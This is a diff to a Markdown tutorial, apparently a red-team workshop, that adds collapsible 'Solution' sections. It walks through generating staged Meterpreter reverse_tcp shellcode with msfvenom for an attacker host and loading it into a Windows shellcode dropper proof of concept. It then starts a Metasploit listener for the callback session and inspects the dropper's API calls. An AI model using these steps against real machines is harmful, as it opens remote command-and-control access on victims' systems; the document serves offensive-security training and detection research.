@@ -165,22 +165,25 @@ int main() {
     
 ## Meterpreter Shellcode
 In this step, we will create our meterpreter shellcode for the HLA dropper poc with msfvenom in Kali Linux. To do this, we will use the following command and create x64 staged meterpreter shellcode.
+<details>
+**kali>**       
 ```
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IPv4_Redirector_or_IPv4_Kali LPORT=80 -f c > /tmp/shellcode.txt
 ```
 <p align="center">
 <img width="696" alt="image" src="https://user-images.githubusercontent.com/50073731/235358025-7267f8c6-918e-44e9-b767-90dbd9afd8da.png">
 </p>
-
+    
 The shellcode can then be copied into the HLA dropper poc by replacing the placeholder at the unsigned char, and the poc can be compiled as an x64 release.
 <p align="center">
 <img width="479" alt="image" src="https://user-images.githubusercontent.com/50073731/235414557-d236582b-5bab-4754-bd12-5f7817660c3a.png">
 </p>
-
+</details>
+    
 
 ## MSF-Listener
 Before we test the functionality of our HLA-Dropper, we need to create a listener within msfconsole.
-
+<details>
 **kali>**
 ```
 msfconsole
@@ -197,27 +200,36 @@ run
 <p align="center">
 <img width="510" alt="image" src="https://user-images.githubusercontent.com/50073731/235358630-09f70617-5f6e-4f17-b366-131f8efe19d7.png">
 </p>
-
+</details>
+ 
+    
 Once the listener has been successfully started, you can run your compiled high_level_dropper.exe. If all goes well, you should see an incoming command and control session 
-
+<details>
+    
 <p align="center">
 <img width="674" alt="image" src="https://user-images.githubusercontent.com/50073731/235369228-84576762-b3b0-4cf7-a265-538995d42c40.png">
 </p>
-
+</details>
 
 
 ## HLA-Dropper analysis: dumpbin tool
-The Visual Studio tool dumpbin can be used to check which Windows APIs are imported via kernel32.dll. The following command can be used to check the imports.
+The Visual Studio tool dumpbin can be used to check which Windows APIs are imported via kernel32.dll. Which results do you expect? The following command can be used to check the imports.
 **cmd>**
 ```
 cd C:\Program Files (x86)\Microsoft Visual Studio\2019\Community
 dumpbin /imports high_level.exe
 ```
+<details>
+    
+    <summary>Solution</summary>
+    
 In the case of the HLA-Dropper, you should see that the Windows APIs VirtualAlloc, WriteProcessMemory, CreateThread and WaitForSingleObject are correctly imported into the HLA-Dropper from the kernel32.dll.
 <p align="center">
 <img width="693" alt="image" src="https://user-images.githubusercontent.com/50073731/235369396-dbad1178-e9a2-4c55-8c6a-fdc9362d864c.png">
 </p>
+</details>
 
+    
 ## HLA-Dropper analysis: API-Monitor
 We use API Monitor to check the transition from the four used Windows APIs to the four corresponding native APIs.
 For a correct check, it is necessary to filter to the correct APIs. Only by providing the correct Windows APIs and corresponding native APIs, which can prove the transition from Windows APIs (kernel32.dll) to native APIs (ntdll.dll), in the context of the HLA-Dropper, we filter on the following API calls:
@@ -230,11 +242,16 @@ For a correct check, it is necessary to filter to the correct APIs. Only by prov
 - WaitForSingleObject
 - NtWaitForSingleObject
 
+<details>
+    <summary>Solution</summary>
+    
 If everything was done correctly, you should see clean transitions from the Windows APIs used to the native APIs we used in our HLA-Dropper POC.
 <p align="center">
 <img width="498" alt="image" src="https://user-images.githubusercontent.com/50073731/235368737-9f87f5de-0a7e-4039-b454-2af23914b277.png">
 </p>
+</details>
 
+    
 ## HLA-Dropper analysis: x64dbg 
 Using x64dbg I check from which region of the PE structure of the HLA-Dropper the system call for the native API NtAllocateVirtualMemory is executed. As direct system calls are not yet used in this dropper, the figure shows that the system call is correctly executed from the .text region of ntdll.dll. This investigation is very important because later in the article we expect a different result with the low level dropper and want to match it.
 ![image](https://user-images.githubusercontent.com/50073731/235368598-ad159117-abb5-4b0d-8b52-bea2a162b565.png)
